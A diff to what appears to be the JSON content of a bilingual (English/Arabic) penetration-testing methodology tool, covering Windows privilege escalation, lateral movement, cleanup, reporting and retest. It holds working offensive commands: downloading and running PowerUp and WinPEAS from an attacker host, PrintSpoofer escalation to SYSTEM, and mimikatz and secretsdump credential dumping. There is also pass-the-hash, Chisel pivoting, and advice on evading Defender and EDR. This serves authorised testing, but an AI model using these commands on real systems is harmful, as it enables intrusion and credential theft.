+          "ar": "ألوان LinPEAS هي كل شيء. الأحمر الفاتح = اختبر أولاً. قاعدة sudo واحدة أو ملف SUID قابل للتنفيذ هو كل ما تحتاجه للوصول إلى root."
+        }
       },
       {
         "id": "pe2",
-        "title": "Windows Privilege Escalation",
+        "title": {
+          "en": "Windows Privilege Escalation",
+          "ar": "تصعيد الصلاحيات على Windows"
+        },
         "priority": "critical",
-        "summary": "Escalate from low-privilege user to SYSTEM on Windows.",
+        "summary": {
+          "en": "Escalate from low-privilege user to SYSTEM on Windows.",
+          "ar": "التصعيد من مستخدم منخفض الصلاحيات إلى SYSTEM على Windows."
+        },
         "checklist": [
-          "Run WinPEAS automated scan",
-          "Check whoami /priv (SeImpersonatePrivilege = instant SYSTEM)",
-          "Run PowerUp.ps1 Invoke-AllChecks",
-          "AlwaysInstallElevated registry check",
-          "Stored credentials: cmdkey /list",
-          "Unquoted service paths and weak service permissions"
+          {
+            "en": "Run WinPEAS automated scan",
+            "ar": "تشغيل فحص WinPEAS الآلي"
+          },
+          {
+            "en": "Check whoami /priv (SeImpersonatePrivilege = instant SYSTEM)",
+            "ar": "فحص whoami /priv (SeImpersonatePrivilege = SYSTEM فوري)"
+          },
+          {
+            "en": "Run PowerUp.ps1 Invoke-AllChecks",
+            "ar": "تشغيل PowerUp.ps1 Invoke-AllChecks"
+          },
+          {
+            "en": "AlwaysInstallElevated registry check",
+            "ar": "فحص إعداد السجل AlwaysInstallElevated"
+          },
+          {
+            "en": "Stored credentials: cmdkey /list",
+            "ar": "بيانات اعتماد مخزّنة: cmdkey /list"
+          },
+          {
+            "en": "Unquoted service paths and weak service permissions",
+            "ar": "مسارات خدمة غير محصورة بعلامات اقتباس وصلاحيات خدمة ضعيفة"
+          }
         ],
         "commands": [
           {
             "id": "pe2c1",
-            "title": "WinPEAS + SeImpersonatePrivilege",
-            "purpose": "Automated scan and instant SYSTEM via token privilege abuse",
+            "title": {
+              "en": "WinPEAS + SeImpersonatePrivilege",
+              "ar": "WinPEAS + SeImpersonatePrivilege"
+            },
+            "purpose": {
+              "en": "Automated scan and instant SYSTEM via token privilege abuse",
+              "ar": "فحص آلي وSYSTEM فوري عبر استغلال صلاحية الرمز المميز"
+            },
             "cmd": "# Transfer and run WinPEAS:\npython3 -m http.server 8000  # on attacker\ncertutil -urlcache -f http://{YOUR_IP}:8000/winPEASx64.exe C:\\Windows\\Temp\\wp.exe\nC:\\Windows\\Temp\\wp.exe | Out-File C:\\Windows\\Temp\\wp.txt\n\n# Check token privileges:\nwhoami /priv\n\n# SeImpersonatePrivilege present? -> Instant SYSTEM:\nPrintSpoofer64.exe -i -c cmd\nGodPotato.exe -cmd 'cmd /c whoami'\n\n# PowerUp.ps1 automated checks:\npowershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://{YOUR_IP}:8000/PowerUp.ps1'); Invoke-AllChecks\"",
             "example": "certutil -urlcache -f http://192.168.1.50:8000/winPEASx64.exe wp.exe && wp.exe\nwhoami /priv  # look for SeImpersonatePrivilege",
             "flags": [
               {
                 "f": "-i",
-                "d": "PrintSpoofer: interact with spawned process"
+                "d": {
+                  "en": "PrintSpoofer: interact with spawned process",
+                  "ar": "PrintSpoofer: التفاعل مع العملية المُولَّدة"
+                }
               },
               {
                 "f": "-c cmd",
-                "d": "PrintSpoofer: command to run as SYSTEM"
+                "d": {
+                  "en": "PrintSpoofer: command to run as SYSTEM",
+                  "ar": "PrintSpoofer: الأمر للتشغيل بصلاحية SYSTEM"
+                }
               },
               {
                 "f": "-ep bypass",
-                "d": "PowerShell: bypass execution policy"
+                "d": {
+                  "en": "PowerShell: bypass execution policy",
+                  "ar": "PowerShell: تجاوز سياسة التنفيذ"
+                }
               }
             ],
-            "note": "SeImpersonatePrivilege is extremely common on IIS, SQL Server, and other service accounts. PrintSpoofer works 95% of the time.",
-            "out": "WinPEAS color-coded findings + instant SYSTEM shell via PrintSpoofer"
+            "note": {
+              "en": "SeImpersonatePrivilege is extremely common on IIS, SQL Server, and other service accounts. PrintSpoofer works 95% of the time.",
+              "ar": "SeImpersonatePrivilege شائعة جداً على IIS وSQL Server وحسابات خدمة أخرى. PrintSpoofer ينجح 95% من الوقت."
+            },
+            "out": {
+              "en": "WinPEAS color-coded findings + instant SYSTEM shell via PrintSpoofer",
+              "ar": "نتائج WinPEAS مرمّزة بالألوان + صدفة SYSTEM فورية عبر PrintSpoofer"
+            }
           },
           {
             "id": "pe2c2",
-            "title": "Mimikatz + secretsdump",
-            "purpose": "Extract credentials from Windows memory and remote SAM/NTDS",
-            "cmd": "# Mimikatz (local):\nmimikatz.exe\nmimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords\nmimikatz # lsadump::sam\nmimikatz # lsadump::dcsync /user:krbtgt\n\n# Remote dump via Impacket (no file on target \u2014 stealthier):\nimpacket-secretsdump {DOMAIN}/{ADMIN}:'{PASS}'@{TARGET_IP}\nimpacket-secretsdump {DOMAIN}/{ADMIN}:'{PASS}'@{DC_IP} -just-dc-user krbtgt",
+            "title": {
+              "en": "Mimikatz + secretsdump",
+              "ar": "Mimikatz + secretsdump"
+            },
+            "purpose": {
+              "en": "Extract credentials from Windows memory and remote SAM/NTDS",
+              "ar": "استخراج بيانات الاعتماد من ذاكرة Windows وSAM/NTDS عن بُعد"
+            },
+            "cmd": "# Mimikatz (local):\nmimikatz.exe\nmimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords\nmimikatz # lsadump::sam\nmimikatz # lsadump::dcsync /user:krbtgt\n\n# Remote dump via Impacket (no file on target — stealthier):\nimpacket-secretsdump {DOMAIN}/{ADMIN}:'{PASS}'@{TARGET_IP}\nimpacket-secretsdump {DOMAIN}/{ADMIN}:'{PASS}'@{DC_IP} -just-dc-user krbtgt",
             "example": "mimikatz # privilege::debug -> sekurlsa::logonpasswords\nimpacket-secretsdump acme.local/administrator:'Password123'@192.168.1.10",
             "flags": [
               {
                 "f": "privilege::debug",
-                "d": "Enable debug privileges (required)"
+                "d": {
+                  "en": "Enable debug privileges (required)",
+                  "ar": "تفعيل صلاحيات التصحيح (مطلوب)"
+                }
               },
               {
                 "f": "sekurlsa::logonpasswords",
-                "d": "Dump LSASS memory (may include plaintext)"
+                "d": {
+                  "en": "Dump LSASS memory (may include plaintext)",
+                  "ar": "تفريغ ذاكرة LSASS (قد تتضمن نصاً صريحاً)"
+                }
               },
               {
                 "f": "lsadump::sam",
-                "d": "Dump local SAM database"
+                "d": {
+                  "en": "Dump local SAM database",
+                  "ar": "تفريغ قاعدة بيانات SAM المحلية"
+                }
               },
               {
                 "f": "-just-dc-user",
-                "d": "Extract only specified account hash"
+                "d": {
+                  "en": "Extract only specified account hash",
+                  "ar": "استخراج هاش حساب محدد فقط"
+                }
               }
             ],
-            "note": "Defender catches mimikatz.exe. Use impacket-secretsdump remotely \u2014 no file on target, much stealthier.",
-            "out": "Plaintext passwords or NTLM hashes for all logged-on accounts"
+            "note": {
+              "en": "Defender catches mimikatz.exe. Use impacket-secretsdump remotely — no file on target, much stealthier.",
+              "ar": "Defender يكتشف mimikatz.exe. استخدم impacket-secretsdump عن بُعد — دون ملف على الهدف، أكثر تخفياً بكثير."
+            },
+            "out": {
+              "en": "Plaintext passwords or NTLM hashes for all logged-on accounts",
+              "ar": "كلمات مرور نصية صريحة أو هاشات NTLM لجميع الحسابات المسجَّلة"
+            }
           }
         ],
         "tools": [
@@ -1013,70 +2045,148 @@
           "GodPotato",
           "Impacket"
         ],
-        "deliverable": "Windows PrivEsc chain: low-priv to SYSTEM with commands and screenshots",
-        "tip": "Always run whoami /priv first. SeImpersonatePrivilege + PrintSpoofer = SYSTEM in 10 seconds \u2014 most reliable Windows privesc."
+        "deliverable": {
+          "en": "Windows PrivEsc chain: low-priv to SYSTEM with commands and screenshots",
+          "ar": "سلسلة تصعيد صلاحيات Windows: من منخفض إلى SYSTEM مع الأوامر ولقطات الشاشة"
+        },
+        "tip": {
+          "en": "Always run whoami /priv first. SeImpersonatePrivilege + PrintSpoofer = SYSTEM in 10 seconds — most reliable Windows privesc.",
+          "ar": "شغّل whoami /priv أولاً دائماً. SeImpersonatePrivilege + PrintSpoofer = SYSTEM خلال 10 ثوانٍ — أكثر طرق تصعيد صلاحيات Windows موثوقية."
+        }
       },
       {
         "id": "pe3",
-        "title": "Lateral Movement + Cleanup",
+        "title": {
+          "en": "Lateral Movement + Cleanup",
+          "ar": "الحركة الجانبية والتنظيف"
+        },
         "priority": "high",
-        "summary": "Move through the network and remove ALL testing artifacts before closing.",
+        "summary": {
+          "en": "Move through the network and remove ALL testing artifacts before closing.",
+          "ar": "التنقل عبر الشبكة وإزالة جميع آثار الاختبار قبل الإغلاق."
+        },
         "checklist": [
-          "Evil-WinRM for Windows remote shells",
-          "Impacket wmiexec/psexec for command execution",
-          "CrackMapExec Pass-the-Hash sweep",
-          "Chisel SOCKS proxy for network pivoting",
-          "Timestamped proof-of-access file on each system",
-          "Remove ALL uploaded tools and files",
-          "Delete ALL created test accounts",
-          "Encrypt and archive all evidence"
+          {
+            "en": "Evil-WinRM for Windows remote shells",
+            "ar": "Evil-WinRM لصدفات Windows عن بُعد"
+          },
+          {
+            "en": "Impacket wmiexec/psexec for command execution",
+            "ar": "Impacket wmiexec/psexec لتنفيذ الأوامر"
+          },
+          {
+            "en": "CrackMapExec Pass-the-Hash sweep",
+            "ar": "مسح Pass-the-Hash شامل عبر CrackMapExec"
+          },
+          {
+            "en": "Chisel SOCKS proxy for network pivoting",
+            "ar": "وكيل Chisel SOCKS للارتداد عبر الشبكة"
+          },
+          {
+            "en": "Timestamped proof-of-access file on each system",
+            "ar": "ملف إثبات وصول موسوم بالوقت على كل نظام"
+          },
+          {
+            "en": "Remove ALL uploaded tools and files",
+            "ar": "إزالة جميع الأدوات والملفات المرفوعة"
+          },
+          {
+            "en": "Delete ALL created test accounts",
+            "ar": "حذف جميع حسابات الاختبار التي تم إنشاؤها"
+          },
+          {
+            "en": "Encrypt and archive all evidence",
+            "ar": "تشفير وأرشفة جميع الأدلة"
+          }
         ],
         "commands": [
           {
             "id": "pe3c1",
-            "title": "Evil-WinRM + Impacket + Chisel",
-            "purpose": "Remote shells, lateral movement, and network pivoting",
+            "title": {
+              "en": "Evil-WinRM + Impacket + Chisel",
+              "ar": "Evil-WinRM + Impacket + Chisel"
+            },
+            "purpose": {
+              "en": "Remote shells, lateral movement, and network pivoting",
+              "ar": "صدفات عن بُعد، حركة جانبية، وارتداد عبر الشبكة"
+            },
             "cmd": "# Evil-WinRM (WinRM port 5985/5986):\nevil-winrm -i {TARGET_IP} -u {USER} -p '{PASS}'\nevil-winrm -i {TARGET_IP} -u {USER} -H {NTLM_HASH}\n\n# Impacket (quietest to noisiest):\nimpacket-wmiexec {DOMAIN}/{USER}:'{PASS}'@{TARGET_IP}\nimpacket-smbexec {DOMAIN}/{USER}:'{PASS}'@{TARGET_IP}\nimpacket-psexec {DOMAIN}/{USER}:'{PASS}'@{TARGET_IP}\nimpacket-wmiexec {DOMAIN}/{USER}@{TARGET_IP} -hashes :{NTLM_HASH}\n\n# Chisel SOCKS pivot:\n./chisel server -p 9001 --reverse                          # attacker\n./chisel.exe client {YOUR_IP}:9001 R:socks                 # on pivot host\necho 'socks5 127.0.0.1 1080' >> /etc/proxychains.conf\nproxychains nmap -sT -p 445,22,3389 {INTERNAL_IP}",
             "example": "evil-winrm -i 192.168.1.100 -u administrator -p 'Password123'\nimpacket-wmiexec acme.local/admin:'Pass123'@192.168.1.100",
             "flags": [
               {
                 "f": "-H",
-                "d": "NTLM hash for Pass-the-Hash"
+                "d": {
+                  "en": "NTLM hash for Pass-the-Hash",
+                  "ar": "هاش NTLM لهجوم Pass-the-Hash"
+                }
               },
               {
                 "f": "-hashes :NTLM",
-                "d": "Impacket PTH format"
+                "d": {
+                  "en": "Impacket PTH format",
+                  "ar": "صيغة Impacket PTH"
+                }
               },
               {
                 "f": "--reverse",
-                "d": "chisel: allow reverse tunnels"
+                "d": {
+                  "en": "chisel: allow reverse tunnels",
+                  "ar": "chisel: السماح بالأنفاق العكسية"
+                }
               },
               {
                 "f": "R:socks",
-                "d": "chisel: create reverse SOCKS5 proxy"
+                "d": {
+                  "en": "chisel: create reverse SOCKS5 proxy",
+                  "ar": "chisel: إنشاء وكيل SOCKS5 عكسي"
+                }
               }
             ],
-            "note": "Always start with wmiexec \u2014 fewest traces. psexec creates a Windows service and is caught by most EDR solutions.",
-            "out": "Interactive remote shell + SOCKS5 proxy at 127.0.0.1:1080"
+            "note": {
+              "en": "Always start with wmiexec — fewest traces. psexec creates a Windows service and is caught by most EDR solutions.",
+              "ar": "ابدأ دائماً بـ wmiexec — أقل الآثار. psexec ينشئ خدمة Windows ويُكتشف من معظم حلول EDR."
+            },
+            "out": {
+              "en": "Interactive remote shell + SOCKS5 proxy at 127.0.0.1:1080",
+              "ar": "صدفة تفاعلية عن بُعد + وكيل SOCKS5 على 127.0.0.1:1080"
+            }
           },
           {
             "id": "pe3c2",
-            "title": "Proof of Access + Cleanup + Archive",
-            "purpose": "Create timestamped evidence and remove all testing artifacts",
+            "title": {
+              "en": "Proof of Access + Cleanup + Archive",
+              "ar": "إثبات الوصول + التنظيف + الأرشفة"
+            },
+            "purpose": {
+              "en": "Create timestamped evidence and remove all testing artifacts",
+              "ar": "إنشاء دليل موسوم بالوقت وإزالة جميع آثار الاختبار"
+            },
             "cmd": "# Proof of access (Linux):\necho -e \"PENTEST PROOF\\nClient: {CLIENT}\\nDate: $(date)\\nHost: $(hostname)\\nUser: $(whoami)\" > /tmp/PENTEST_PROOF.txt\ncat /tmp/PENTEST_PROOF.txt\n\n# Proof of access (Windows CMD):\necho PENTEST PROOF - {CLIENT} - %DATE% %TIME% > C:\\Users\\Public\\PENTEST_PROOF.txt\nhostname >> C:\\Users\\Public\\PENTEST_PROOF.txt && whoami >> C:\\Users\\Public\\PENTEST_PROOF.txt\n\n# Cleanup Linux:\nrm -f /tmp/.lp /tmp/.out.txt /tmp/chisel /tmp/PENTEST_PROOF*.txt\n\n# Cleanup Windows:\ndel /f /q C:\\Windows\\Temp\\*.exe C:\\Users\\Public\\PENTEST_PROOF.txt\n\n# Archive evidence:\ntar czf ~/pentests/{CLIENT}_evidence.tar.gz ~/pentests/{CLIENT}/\ngpg --symmetric --cipher-algo AES256 ~/pentests/{CLIENT}_evidence.tar.gz",
             "example": "echo 'PENTEST PROOF - AcmeCorp' > /tmp/PENTEST_PROOF.txt && cat /tmp/PENTEST_PROOF.txt",
             "flags": [
               {
                 "f": "rm -f",
-                "d": "Force delete without prompts"
+                "d": {
+                  "en": "Force delete without prompts",
+                  "ar": "حذف قسري دون مطالبات"
+                }
               },
               {
                 "f": "--cipher-algo AES256",
-                "d": "AES-256 archive encryption"
+                "d": {
+                  "en": "AES-256 archive encryption",
+                  "ar": "تشفير الأرشيف بـAES-256"
+                }
               }
             ],
-            "note": "Screenshot the proof file + whoami together. Notify client of file location for them to verify and delete.",
-            "out": "Timestamped proof file + clean systems + encrypted evidence archive"
+            "note": {
+              "en": "Screenshot the proof file + whoami together. Notify client of file location for them to verify and delete.",
+              "ar": "التقط لقطة شاشة لملف الإثبات مع whoami معاً. أبلغ العميل بموقع الملف للتحقق والحذف."
+            },
+            "out": {
+              "en": "Timestamped proof file + clean systems + encrypted evidence archive",
+              "ar": "ملف إثبات موسوم بالوقت + أنظمة نظيفة + أرشيف أدلة مشفّر"
+            }
           }
         ],
         "tools": [
@@ -1088,61 +2198,130 @@
           "gpg",
           "tar"
         ],
-        "deliverable": "Lateral movement map + cleanup verification + encrypted evidence archive",
-        "tip": "Draw the path: [Attacker] -> [Host A] -> [Host B] -> [DC]. A diagram communicates lateral movement instantly \u2014 text takes paragraphs."
+        "deliverable": {
+          "en": "Lateral movement map + cleanup verification + encrypted evidence archive",
+          "ar": "خريطة الحركة الجانبية + التحقق من التنظيف + أرشيف أدلة مشفّر"
+        },
+        "tip": {
+          "en": "Draw the path: [Attacker] -> [Host A] -> [Host B] -> [DC]. A diagram communicates lateral movement instantly — text takes paragraphs.",
+          "ar": "ارسم المسار: [مهاجم] -> [مضيف أ] -> [مضيف ب] -> [DC]. الرسم البياني يوصل فكرة الحركة الجانبية فوراً — النص يحتاج فقرات."
+        }
       }
     ]
   },
   {
     "id": "report",
-    "label": "Reporting",
-    "short": "Report",
-    "icon": "\ud83d\udcca",
+    "label": {
+      "en": "Reporting",
+      "ar": "التقرير"
+    },
+    "short": {
+      "en": "Report",
+      "ar": "تقرير"
+    },
+    "icon": "📊",
     "color": "#10b981",
-    "desc": "CVSS scoring, professional report writing, encrypted delivery",
+    "desc": {
+      "en": "CVSS scoring, professional report writing, encrypted delivery",
+      "ar": "تقييم CVSS، كتابة تقرير احترافي، تسليم مشفّر"
+    },
     "steps": [
       {
         "id": "rp1",
-        "title": "CVSS Scoring + Finding Structure",
+        "title": {
+          "en": "CVSS Scoring + Finding Structure",
+          "ar": "تقييم CVSS وهيكلية النتائج"
+        },
         "priority": "critical",
-        "summary": "Score every finding objectively. Identical structure for every finding, every time.",
+        "summary": {
+          "en": "Score every finding objectively. Identical structure for every finding, every time.",
+          "ar": "قيّم كل نتيجة بموضوعية. هيكلية موحّدة لكل نتيجة، في كل مرة."
+        },
         "checklist": [
-          "CVSS v3.1 score for every finding",
-          "Risk category: Critical/High/Medium/Low/Info",
-          "Map to MITRE ATT&CK techniques",
-          "Map to compliance requirements",
-          "Business impact in business language",
-          "Prioritized remediation order"
+          {
+            "en": "CVSS v3.1 score for every finding",
+            "ar": "درجة CVSS v3.1 لكل نتيجة"
+          },
+          {
+            "en": "Risk category: Critical/High/Medium/Low/Info",
+            "ar": "فئة الخطورة: حرجة/عالية/متوسطة/منخفضة/معلوماتية"
+          },
+          {
+            "en": "Map to MITRE ATT&CK techniques",
+            "ar": "الربط بأساليب MITRE ATT&CK"
+          },
+          {
+            "en": "Map to compliance requirements",
+            "ar": "الربط بمتطلبات الامتثال"
+          },
+          {
+            "en": "Business impact in business language",
+            "ar": "الأثر على الأعمال بلغة الأعمال"
+          },
+          {
+            "en": "Prioritized remediation order",
+            "ar": "ترتيب أولويات الإصلاح"
+          }
         ],
         "commands": [
           {
             "id": "rp1c1",
-            "title": "CVSS v3.1 Reference",
-            "purpose": "Objective, consistent risk scoring for all findings",
+            "title": {
+              "en": "CVSS v3.1 Reference",
+              "ar": "مرجع CVSS v3.1"
+            },
+            "purpose": {
+              "en": "Objective, consistent risk scoring for all findings",
+              "ar": "تقييم مخاطر موضوعي وموحَّد لجميع النتائج"
+            },
             "cmd": "# CVSS v3.1 Vector format:\nCVSS:3.1/AV:{AV}/AC:{AC}/PR:{PR}/UI:{UI}/S:{S}/C:{C}/I:{I}/A:{A}\n\n# Attack Vector (AV):    N=Network, A=Adjacent, L=Local, P=Physical\n# Attack Complexity (AC): L=Low, H=High\n# Privileges Required (PR): N=None, L=Low, H=High\n# User Interaction (UI): N=None, R=Required\n# Scope (S):             U=Unchanged, C=Changed\n# Confidentiality (C):   H=High, L=Low, N=None\n# Integrity (I):         H=High, L=Low, N=None\n# Availability (A):      H=High, L=Low, N=None\n\n# Example: Unauthenticated SQLi -> full DB access\n# CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1 CRITICAL\n\n# Calculator: nvd.nist.gov/vuln-metrics/cvss/v3-calculator",
             "example": "Unauth SQLi -> CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N -> 9.1 CRITICAL",
             "flags": [],
-            "note": "Score the raw vulnerability. WAF/compensating controls do not reduce CVSS base score \u2014 note them separately.",
-            "out": "Numerical score 0.0-10.0 with Critical/High/Medium/Low label"
+            "note": {
+              "en": "Score the raw vulnerability. WAF/compensating controls do not reduce CVSS base score — note them separately.",
+              "ar": "قيّم الثغرة الخام. جدار الحماية/الضوابط التعويضية لا تُخفّض درجة CVSS الأساسية — وثّقها بشكل منفصل."
+            },
+            "out": {
+              "en": "Numerical score 0.0-10.0 with Critical/High/Medium/Low label",
+              "ar": "درجة رقمية من 0.0 إلى 10.0 مع تصنيف حرجة/عالية/متوسطة/منخفضة"
+            }
           },
           {
             "id": "rp1c2",
-            "title": "Report Structure + Encrypted Delivery",
-            "purpose": "Standard report structure and secure delivery procedure",
+            "title": {
+              "en": "Report Structure + Encrypted Delivery",
+              "ar": "هيكلية التقرير والتسليم المشفّر"
+            },
+            "purpose": {
+              "en": "Standard report structure and secure delivery procedure",
+              "ar": "هيكلية تقرير موحَّدة وإجراء تسليم آمن"
+            },
             "cmd": "# REQUIRED SECTIONS:\n# 1. Cover Page (client logo, CONFIDENTIAL, version)\n# 2. Table of Contents\n# 3. Executive Summary (1-2 pages, non-technical)\n#    - Overall risk rating\n#    - Finding counts by severity\n#    - Top 3 risks in plain business language\n#    - 3 immediate action items\n# 4. Engagement Overview (scope, methodology, dates)\n# 5. Attack Narrative (story: zero to Domain Admin)\n# 6. Findings (Title, CVSS, CWE, ATT&CK, Evidence, Impact, Remediation)\n# 7. Remediation Roadmap (P1: 7 days, P2: 30 days, P3: 90 days)\n# 8. Positive Observations\n# 9. Appendix (raw tool output, command log)\n\n# Encrypt delivery:\nqpdf --encrypt {PASSWORD} {PASSWORD} 256 -- report.pdf report_enc.pdf\nzip -e --password '{PASSWORD}' delivery.zip report.pdf\n# Send: file via email, password via SMS/Signal (separate channel)",
             "example": "qpdf --encrypt 'TempP@ss2025!' 'TempP@ss2025!' 256 -- acmecorp_report_v1.pdf acmecorp_report_enc.pdf",
             "flags": [
               {
                 "f": "256",
-                "d": "AES-256 PDF encryption"
+                "d": {
+                  "en": "AES-256 PDF encryption",
+                  "ar": "تشفير PDF بـAES-256"
+                }
               },
               {
                 "f": "-e",
-                "d": "ZIP file encryption"
+                "d": {
+                  "en": "ZIP file encryption",
+                  "ar": "تشفير ملف ZIP"
+                }
               }
             ],
-            "note": "NEVER email an unencrypted report. Always separate channels for file and password.",
-            "out": "Professional report + encrypted PDF ready for delivery"
+            "note": {
+              "en": "NEVER email an unencrypted report. Always separate channels for file and password.",
+              "ar": "لا تُرسل تقريراً غير مشفّر عبر البريد الإلكتروني أبداً. استخدم دائماً قنوات منفصلة للملف وكلمة المرور."
+            },
+            "out": {
+              "en": "Professional report + encrypted PDF ready for delivery",
+              "ar": "تقرير احترافي + PDF مشفّر جاهز للتسليم"
+            }
           }
         ],
         "tools": [
@@ -1152,64 +2331,142 @@
           "qpdf",
           "MS Word"
         ],
-        "deliverable": "Encrypted final report + executive presentation deck",
-        "tip": "Business impact is everything. 'Unauthenticated RCE' means nothing to a CEO. 'An attacker can take full control of all servers in minutes with no credentials' does."
+        "deliverable": {
+          "en": "Encrypted final report + executive presentation deck",
+          "ar": "تقرير نهائي مشفّر + عرض تنفيذي"
+        },
+        "tip": {
+          "en": "Business impact is everything. 'Unauthenticated RCE' means nothing to a CEO. 'An attacker can take full control of all servers in minutes with no credentials' does.",
+          "ar": "الأثر على الأعمال هو كل شيء. 'تنفيذ كود عن بُعد دون مصادقة' لا يعني شيئاً للمدير التنفيذي. 'يمكن للمهاجم السيطرة الكاملة على جميع الخوادم خلال دقائق دون بيانات اعتماد' يعني كل شيء."
+        }
       }
     ]
   },
   {
     "id": "retest",
-    "label": "Re-test",
-    "short": "Retest",
-    "icon": "\u2705",
+    "label": {
+      "en": "Re-test",
+      "ar": "إعادة الاختبار"
+    },
+    "short": {
+      "en": "Retest",
+      "ar": "إعادة فحص"
+    },
+    "icon": "✅",
     "color": "#22c55e",
-    "desc": "Verify remediations, issue attestation, close engagement professionally",
+    "desc": {
+      "en": "Verify remediations, issue attestation, close engagement professionally",
+      "ar": "التحقق من الإصلاحات، إصدار شهادة، إغلاق المهمة باحترافية"
+    },
     "steps": [
       {
         "id": "rt1",
-        "title": "Remediation Verification + Closure",
+        "title": {
+          "en": "Remediation Verification + Closure",
+          "ar": "التحقق من الإصلاح والإغلاق"
+        },
         "priority": "critical",
-        "summary": "Re-test every finding after remediation window. Incomplete patches are extremely common.",
+        "summary": {
+          "en": "Re-test every finding after remediation window. Incomplete patches are extremely common.",
+          "ar": "أعد اختبار كل نتيجة بعد فترة الإصلاح. التصحيحات غير المكتملة شائعة للغاية."
+        },
         "checklist": [
-          "Request remediation status (30-90 days post-report)",
-          "Re-test all Critical and High findings",
-          "Re-test Medium/Low that client claims fixed",
-          "Verify patches correctly applied (not just partial)",
-          "Document: Resolved/Partial/Not Resolved/Risk Accepted",
-          "Attestation letter on company letterhead",
-          "Delete ALL client credentials from your systems",
-          "Archive evidence securely",
-          "Propose retainer or annual re-test"
+          {
+            "en": "Request remediation status (30-90 days post-report)",
+            "ar": "طلب حالة الإصلاح (30-90 يوماً بعد التقرير)"
+          },
+          {
+            "en": "Re-test all Critical and High findings",
+            "ar": "إعادة اختبار جميع النتائج الحرجة والعالية"
+          },
+          {
+            "en": "Re-test Medium/Low that client claims fixed",
+            "ar": "إعادة اختبار النتائج المتوسطة/المنخفضة التي يدّعي العميل إصلاحها"
+          },
+          {
+            "en": "Verify patches correctly applied (not just partial)",
+            "ar": "التحقق من تطبيق التصحيحات بشكل صحيح (وليس جزئياً فقط)"
+          },
+          {
+            "en": "Document: Resolved/Partial/Not Resolved/Risk Accepted",
+            "ar": "التوثيق: تم الحل/جزئي/لم يُحل/المخاطرة مقبولة"
+          },
+          {
+            "en": "Attestation letter on company letterhead",
+            "ar": "خطاب شهادة على ورق رسمي للشركة"
+          },
+          {
+            "en": "Delete ALL client credentials from your systems",
+            "ar": "حذف جميع بيانات اعتماد العميل من أنظمتك"
+          },
+          {
+            "en": "Archive evidence securely",
+            "ar": "أرشفة الأدلة بشكل آمن"
+          },
+          {
+            "en": "Propose retainer or annual re-test",
+            "ar": "اقتراح عقد دائم أو إعادة اختبار سنوية"
+          }
         ],
         "commands": [
           {
             "id": "rt1c1",
-            "title": "Re-test Core Vulnerabilities",
-            "purpose": "Verify that remediations actually fix the identified vulnerabilities",
+            "title": {
+              "en": "Re-test Core Vulnerabilities",
+              "ar": "إعادة اختبار الثغرات الأساسية"
+            },
+            "purpose": {
+              "en": "Verify that remediations actually fix the identified vulnerabilities",
+              "ar": "التحقق من أن الإصلاحات تُعالج الثغرات المكتشفة فعلياً"
+            },
             "cmd": "# Re-test SQLi (should return 'not injectable'):\nsqlmap -u '{URL}?id=1' --dbs --batch -v 1\ncurl -s '{URL}?id=1 OR 1=1' | grep -ic 'error\\|sql\\|syntax'\n\n# Re-test brute force protection:\nfor i in $(seq 1 6); do curl -s -d 'user=admin&pass=wrongpass' {URL}/login | grep -c 'lock\\|too many'; done\n\n# Always test EXACT same attack that worked before\n# Document: [BEFORE screenshot] vs [AFTER screenshot] side-by-side",
             "example": "sqlmap -u 'https://acmecorp.com/products?id=1' --dbs --batch -> 'not injectable' = fix confirmed",
             "flags": [],
-            "note": "Show ORIGINAL vulnerable response and NEW fixed response side-by-side. The contrast IS the proof of remediation.",
-            "out": "'Not injectable' / 'Attack fails' confirming fix OR continued vulnerability"
+            "note": {
+              "en": "Show ORIGINAL vulnerable response and NEW fixed response side-by-side. The contrast IS the proof of remediation.",
+              "ar": "أظهر الاستجابة الضعيفة الأصلية والاستجابة الجديدة المُصلَحة جنباً إلى جنب. التباين هو إثبات الإصلاح."
+            },
+            "out": {
+              "en": "'Not injectable' / 'Attack fails' confirming fix OR continued vulnerability",
+              "ar": "'غير قابل للحقن' / 'الهجوم يفشل' يؤكد الإصلاح أو استمرار الثغرة"
+            }
           },
           {
             "id": "rt1c2",
-            "title": "Attestation Letter + Credential Purge",
-            "purpose": "Formal compliance letter and secure credential removal from your systems",
+            "title": {
+              "en": "Attestation Letter + Credential Purge",
+              "ar": "خطاب الشهادة وحذف بيانات الاعتماد"
+            },
+            "purpose": {
+              "en": "Formal compliance letter and secure credential removal from your systems",
+              "ar": "خطاب امتثال رسمي وإزالة آمنة لبيانات الاعتماد من أنظمتك"
+            },
             "cmd": "# ATTESTATION LETTER FORMAT (on company letterhead):\n# To Whom It May Concern:\n# [YOUR COMPANY] performed a professional penetration test on behalf\n# of [CLIENT NAME] between [START DATE] and [END DATE].\n# Scope: [IP ranges, domains, network]\n# Methodology: PTES + OWASP Testing Guide\n# Testers: [Names, Certs: OSCP/CEH/GPEN]\n# Of [X] findings: [Y] resolved (verified [RETEST DATE])\n# [Z] accepted as risk by [EXEC NAME] on [DATE]\n# Signed: [Your Name, Certs, Title, Company]\n\n# Securely purge client credentials:\nshred -vzu -n 3 ~/pentests/{CLIENT}/exploitation/credentials.txt\nshred -vzu -n 3 ~/pentests/{CLIENT}/exploitation/*.txt\nhistory -c && history -w",
             "example": "Issue on company letterhead. Required for PCI-DSS, SOC 2, cyber insurance renewals.",
             "flags": [
               {
                 "f": "-vzu",
-                "d": "shred: verbose, zero-fill, remove"
+                "d": {
+                  "en": "shred: verbose, zero-fill, remove",
+                  "ar": "shred: تفصيلي، تعبئة بالأصفار، إزالة"
+                }
               },
               {
                 "f": "-n 3",
-                "d": "shred: overwrite 3 times before deletion"
+                "d": {
+                  "en": "shred: overwrite 3 times before deletion",
+                  "ar": "shred: الكتابة فوق الملف 3 مرات قبل الحذف"
+                }
               }
             ],
-            "note": "Clients need this for PCI-DSS QSA audits, SOC 2, cyber insurance, partner due diligence. Price it as a separate deliverable.",
-            "out": "Formal attestation letter + clean attack machine"
+            "note": {
+              "en": "Clients need this for PCI-DSS QSA audits, SOC 2, cyber insurance, partner due diligence. Price it as a separate deliverable.",
+              "ar": "يحتاج العملاء هذا لتدقيقات PCI-DSS QSA وSOC 2 والتأمين السيبراني وفحص الشركاء. سعّره كمُخرَج منفصل."
+            },
+            "out": {
